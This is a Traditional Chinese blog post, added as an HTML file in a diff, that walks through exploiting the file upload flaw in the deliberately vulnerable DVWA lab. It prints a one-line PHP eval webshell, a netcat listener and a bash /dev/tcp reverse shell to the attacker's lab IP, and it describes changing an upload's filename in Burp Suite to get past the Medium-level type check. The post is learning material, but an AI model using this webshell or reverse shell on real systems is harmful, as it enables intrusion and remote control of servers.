@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>DWVA file upload Privilege Escalation - YeeTiao 通往未知領域的路</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Environmentvictim：CentOS 7.6 with DVWA（IP：192.168.0.250）attacker：macOS Mojave（IP：192.168.0.1），Kali Linux（IP：192.168.0.128）  victim無配置iptables rules. Security Level:Low在Security Level為Low時，file upload可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DWVA file upload Privilege Escalation">
+<meta property="og:url" content="http://example.com/2019/08/29/DWVA-file-upload-Privilege-Escalation/index.html">
+<meta property="og:site_name" content="YeeTiao 通往未知領域的路">
+<meta property="og:description" content="Environmentvictim：CentOS 7.6 with DVWA（IP：192.168.0.250）attacker：macOS Mojave（IP：192.168.0.1），Kali Linux（IP：192.168.0.128）  victim無配置iptables rules. Security Level:Low在Security Level為Low時，file upload可">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://i.imgur.com/WO8NmPT.png">
+<meta property="og:image" content="https://i.imgur.com/QTSj0gT.png">
+<meta property="og:image" content="https://i.imgur.com/qkUQgFH.png">
+<meta property="og:image" content="https://i.imgur.com/ZtXzi8m.png">
+<meta property="og:image" content="https://i.imgur.com/hkILVZF.png">
+<meta property="article:published_time" content="2019-08-29T09:42:51.000Z">
+<meta property="article:modified_time" content="2022-02-08T09:45:15.711Z">
+<meta property="article:author" content="YeeTiao Chen">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="DVWA">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="file upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/WO8NmPT.png">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <!-- blair add baidu tongji start... @2017.10.03 -->
+<!-- blair add baidu tongji end ! @2017.10.03 -->
+
+<header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+      <a id="logo" class="logo" href="/"></a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/archives">文章總覽</a>
+        
+          <a class="main-nav-link" href="/about">關於我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+        </div>
+      </nav>
+    </div>
+  </div>
+</header>
+
+    <br>
+    <section id="main" class="outer"><article id="post-DWVA-file-upload-Privilege-Escalation" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DWVA file upload Privilege Escalation
+      <small class=article-detail-date-index>&nbsp; 2019-08-29</small>
+    </h1>
+  
+
+
+        <div class=page-title></div>
+        <br>
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/29/DWVA-file-upload-Privilege-Escalation/" class="article-date">
+  <time datetime="2019-08-29T09:42:51.000Z" itemprop="datePublished">2019-08-29</time>
+</a>-->
+      <!-- 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Security/">Security</a>
+  </div>
+
+--><!-- by blair 160724 -->
+      <!-- by blair
+      
+      -->
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>victim：CentOS 7.6 with DVWA（IP：192.168.0.250）<br>attacker：macOS Mojave（IP：192.168.0.1），Kali Linux（IP：192.168.0.128） </p>
+<p>victim無配置iptables rules.</p>
+<h2 id="Security-Level-Low"><a href="#Security-Level-Low" class="headerlink" title="Security Level:Low"></a>Security Level:Low</h2><p>在Security Level為Low時，file upload可上傳任何檔案，因此上傳包含<em>一句話木馬</em>的php檔至伺服器。</p>
+<p>Security Level = low，source code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); </span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder? </span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; </span><br><span class="line">        // No </span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Yes! </span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>in Hack.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/WO8NmPT.png"><br>*一句話木馬詳細原理待補充</p>
+<h2 id="Altman"><a href="#Altman" class="headerlink" title="Altman"></a>Altman</h2><p>Altman為一跨平台webshell程式，可在macOS、Linux、Windows等系統上執行使用。<br>於畫面點選右鍵新增webshell，依序填入webshell別名、木馬執行方式、URL、一句話木馬中的字串。<br><img src="https://i.imgur.com/QTSj0gT.png"><br>右鍵點選可執行檔案總管、shell指令畫面等。<br><img src="https://i.imgur.com/qkUQgFH.png"><br>在此選擇shellCmder，驗證當前使用者，為<code>apache</code>。<br><img src="https://i.imgur.com/ZtXzi8m.png"><br>但在此並無法將使用者切換為root以及執行其他大部分程式（為低權限模式）。<br>而我們需要在victim上製作一個反彈shell，使得我們以<strong>interactive shell</strong>的方式與victim進行互動。<br>先在Kali Linux上開啟port 2333等待victim連接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333    #此套件為netcat</span><br><span class="line">listening on [any] 2333</span><br></pre></td></tr></table></figure>
+
+<p>在Altman下指令連接至Kali Linux以port 2333進行連接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>在Kali Linux的Terminal可以發現連線成功並以interactive shell，而可以直接切換至root。<br><img src="https://i.imgur.com/hkILVZF.png"></p>
+<h2 id="Security-Level：Medium"><a href="#Security-Level：Medium" class="headerlink" title="Security Level：Medium"></a>Security Level：Medium</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; </span><br><span class="line">    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; </span><br><span class="line">    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>從Source code發現，此層級只允許上傳jpg以及png類型的檔案，並且大小為100KB以下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">因此須將一句話木馬以jpg/png為副檔名來上傳，再使用Burp Suite擷取封包並且從中更改副檔名。Burp Suite以proxy的方式進行運作，所以瀏覽器需要設定proxy，預設port為8080。</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/DuimiM8.png)</span><br><span class="line"></span><br><span class="line">將intercept切換為on，使Burp Suite接收封包。</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/B6ZkGTp.png)</span><br><span class="line"></span><br><span class="line">在Content-Disposition中，將```filename=&quot;hack-medium.php&quot;```更改為```filename=&quot;hack-medium.png&quot;```，如此伺服器接收到的仍是PNG類型，但實際存放時的檔案類型為php。</span><br><span class="line">之後執行webshell以及提權方法皆與security level=low時一樣。</span><br><span class="line"></span><br><span class="line">## Security Level：High</span><br><span class="line">```&lt;?php </span><br><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); </span><br><span class="line">    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><code>strrpos()</code>函數為尋找指定字串最後出現的位置。</p>
+<p><code>substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);</code>首先取得<code>&#39;.&#39;</code>最後出現的位置後再+1，以此數值使用<code>substr</code>函數取得該位置起始的字串。<br>也就是說<code>$uploaded_ext</code>會是一個為副檔名的字串（like ‘jpg’）。</p>
+<p><code>getimagesize()</code>此函數將取得圖像的大小與相關訊息。<br>Example：<br><code>Array ( [0] =&gt; 105 [1] =&gt; 60 [2] =&gt; 3 [3] =&gt; width=&quot;105&quot; height=&quot;60&quot; [bits] =&gt; 8 [mime] =&gt; image/png )</code></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">Linux 反弹shell（二）反弹shell的本质</a><br><a target="_blank" rel="noopener" href="https://legoc.github.io/2018/09/20/Linux%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/">Linux提权思路+实战</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/188852.html">记一次曲折的Linux提权</a></p>
+
+      
+    
+    </div>
+    
+      <div class="article-toc">
+        <h3>目錄</h3>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment"><span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Level-Low"><span class="toc-text">Security Level:Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Altman"><span class="toc-text">Altman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Level%EF%BC%9AMedium"><span class="toc-text">Security Level：Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
+      </div>
+    
+    
+      <footer class="article-footer">
+        <!-- <div class="well" style="width:100px; height:30px;"></div>  by blair-->
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Security/">Security</a>
+  </div>
+
+ <!-- by blair add 160724-->
+        <!--
+        <div style="width:100px; height:30px;"></div> by blair add 160724
+        -->
+        
+  <div class="article-tag">
+    <a class="article-tag-none-link" href="/tags/DVWA/" rel="tag">DVWA</a><span></span><a class="article-tag-none-link" href="/tags/Linux/" rel="tag">Linux</a><span></span><a class="article-tag-none-link" href="/tags/file-upload/" rel="tag">file upload</a><span></span><a class="article-tag-none-link" href="/tags/webshell/" rel="tag">webshell</a>
+  </div>
+
+
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/02/07/%E5%BE%9E-0-%E9%96%8B%E5%A7%8B%EF%BC%8C%E7%94%A8-Hexo-%E6%90%AD%E9%85%8D-GitHub-Pages-%E8%A3%BD%E4%BD%9C%E9%83%A8%E8%90%BD%E6%A0%BC-1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-title"><span>&lt;</span>&nbsp;
+        
+          從 0 開始，用 Hexo 搭配 GitHub Pages 製作部落格 1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/08/26/Linux-Programming-I-O-Redirection%E3%80%81Pipeline/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux Programming I/O Redirection、Pipeline&nbsp;<span>&gt;</span></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 YeeTiao Chen&nbsp;
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a target="_blank" rel="noopener" href="http://github.com/52binge/hexo-theme-blairos">blairos</a>
+    </div>
+  </div>
+</footer>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    extensions: ["tex2jax.js"],
+    jax: ["input/TeX"],
+    tex2jax: {
+      inlineMath: [ ['$','$'], ['\\(','\\)'] ],
+      displayMath: [ ['$$','$$']],
+      processEscapes: true
+    }
+  });
+</script>
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML,http://myserver.com/MathJax/config/local/local.js">
+</script>
+
+    
+
+<script src="/js/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
